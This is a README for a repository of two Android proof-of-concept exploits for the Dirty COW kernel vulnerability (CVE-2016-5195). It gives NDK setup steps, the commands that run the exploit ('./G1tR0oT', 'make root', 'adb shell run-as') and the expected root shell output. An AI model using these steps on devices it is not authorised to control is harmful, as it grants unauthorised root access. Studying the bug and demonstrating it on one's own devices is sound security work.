This repo contains 2 seperate projects:

1  GetRoot-Android-DirtyCow

And:

2  CVE-2016-5195



1 GetRoot-Android-DirtyCow

 Get temporary root on android by exploiting the dirtycow vulnerability.


Run in android or linux:

  ./G1tR0oT

Should execute and result in a root shell



2 CVE-2016-5195

(dirty cow/dirtycow/dirtyc0w) poc for Android

This repo (cloned from https://github.com/timwr/CVE-2016-5195) demonstrates the vulnerability on vulnerable Android devices attached via ADB.

It does not disable SELinux (see https://github.com/timwr/CVE-2016-5195/issues/9) or install superuser on the device.


Make sure you have android-ndk installed: check if you have "ndk-build" in your path:

  which ndk-build

To install android-ndk:

  cd $HOME

  wget https://dl.google.com/android/repository/android-ndk-r14b-linux-x86_64.zip #For darwin: https://dl.google.com/android/repository/android-ndk-r14b-darwin-x86_64.zip

  unzip android-ndk-r14b-linux-x86_64.zip

  cd $HOME/android-ndk-r14b/

Add android-ndk to path

  export PATH="$PATH:$HOME/android-ndk-r14b/"


To run script:

  cd CVE-2016-5195

  make root


If exploited, you should execute:

  adb shell /system/bin/run-as


And running:

  id

Should output "uid=0":

  uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log)......
  
  
  
  Other info/links:
  https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
  https://dirtycow.ninja/
